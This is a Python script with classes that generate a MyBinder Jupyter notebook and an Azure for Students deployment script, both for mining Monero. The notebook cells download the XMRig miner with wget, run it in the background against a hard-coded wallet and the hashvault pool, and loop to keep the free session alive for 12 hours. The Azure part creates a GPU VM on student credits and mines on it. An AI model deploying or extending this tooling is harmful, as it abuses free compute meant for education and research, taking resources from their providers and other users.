#!/usr/bin/env python3
"""MyBinder Mining Agent - No registration required.

MyBinder provides free Jupyter notebooks without login:
- CPU only (no GPU)
- 12h time limit
- No registration required
"""

import json
from typing import Dict, Any


class MyBinderMiner:
    """Deploy mining notebook to MyBinder (no auth)."""
    
    WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
    POOL = "pool.hashvault.pro:80"
    URL = "https://mybinder.org"
    
    @classmethod
    def generate_notebook(cls, wallet: str = None, pool: str = None) -> Dict:
        """Generate Jupyter notebook with CPU mining."""
        wallet = wallet or cls.WALLET
        pool = pool or cls.POOL
        
        return {
            "cells": [
                {
                    "cell_type": "markdown",
                    "source": ["# CPU Mining (No Registration)\n", "\n", "Free CPU mining on MyBinder (12h limit)"],
                    "metadata": {}
                },
                {
                    "cell_type": "code",
                    "source": [
                        "# Setup XMRig\n",
                        "!apt-get update -qq > /dev/null 2>&1\n",
                        "!apt-get install -y wget > /dev/null 2>&1\n",
                        "!wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz\n",
                        "!tar -xf xmrig-6.21.0-linux-static-x64.tar.gz"
                    ],
                    "metadata": {}, "execution_count": None, "outputs": []
                },
                {
                    "cell_type": "code",
                    "source": [
                        "# Start CPU mining (50% threads)\n",
                        "import os\n",
                        f"WALLET = \"{wallet}\"\n",
                        f"POOL = \"{pool}\"\n",
                        "WORKER = f\"binder-{os.environ.get('JUPYTER_IMAGE', 'unknown')[:8]}\"\n",
                        "cmd = f\"./xmrig-6.21.0/xmrig -o {POOL} -u {WALLET}.{WORKER} --donate-level 1 --cpu-max-threads-hint=50 --background\"\n",
                        "print(f'Miner started: {WORKER}')\n",
                        "os.system(cmd)"
                    ],
                    "metadata": {}, "execution_count": None, "outputs": []
                },
                {
                    "cell_type": "code",
                    "source": [
                        "# Keep alive 12h\n",
                        "import time\n",
                        "for i in range(12):\n",
                        "    time.sleep(3600)\n",
                        "    print(f'Hour {i+1}/12')"
                    ],
                    "metadata": {}, "execution_count": None, "outputs": []
                }
            ],
            "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
            "nbformat": 4, "nbformat_minor": 4
        }
    
    @classmethod
    def get_binder_url(cls, github_user: str, github_repo: str, branch: str = "main") -> str:
        """Generate MyBinder URL."""
        return f"https://mybinder.org/v2/gh/{github_user}/{github_repo}/{branch}"
    
    @classmethod
    def get_instructions(cls) -> Dict[str, Any]:
        """Get deployment instructions."""
        return {
            "platform": "mybinder",
            "url": cls.URL,
            "gpu": False,
            "free": True,
            "registration": False,
            "steps": [
                "1. Create GitHub repo with notebook",
                "2. Go to mybinder.org",
                "3. Enter repo URL",
                "4. Launch (NO login!)",
                "5. Run mining cells"
            ]
        }


class AzureStudentMiner:
    """Azure for Students - $100 credits without credit card.
    
    Requirements:
    - .edu email address
    - No credit card needed
    - $100 credits renewable annually
    """
    
    URL = "https://azure.microsoft.com/free/students"
    
    @staticmethod
    def check_edu_email(email: str) -> bool:
        """Check if email is .edu."""
        return email.endswith(".edu")
    
    @classmethod
    def generate_deployment_script(cls) -> str:
        """Generate Azure deployment script."""
        return '''# Azure for Students Mining
# Run in Azure Cloud Shell

az group create --name mining-rg --location eastus

az vm create \\
  --name miner-vm \\
  --resource-group mining-rg \\
  --image Ubuntu2204 \\
  --size Standard_NC6s_v3 \\
  --admin-username azureuser \\
  --generate-ssh-keys

# SSH and run miner
ssh azureuser@$(az vm show -d -g mining-rg -n miner-vm --query publicIps -o tsv)

# On VM:
wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
./xmrig-6.21.0/xmrig -o pool.hashvault.pro:80 -u WALLET.azure --donate-level 1
'''
    
    @classmethod
    def get_instructions(cls) -> Dict[str, Any]:
        """Get registration instructions."""
        return {
            "platform": "azure_student",
            "url": cls.URL,
            "gpu": True,
            "free_credits": "$100",
            "requires_edu": True,
            "phone_required": False,
            "steps": [
                "1. Get .edu email",
                "2. Sign up with .edu",
                "3. Verify student status",
                "4. Get $100 credits",
                "5. Create GPU VM"
            ]
        }
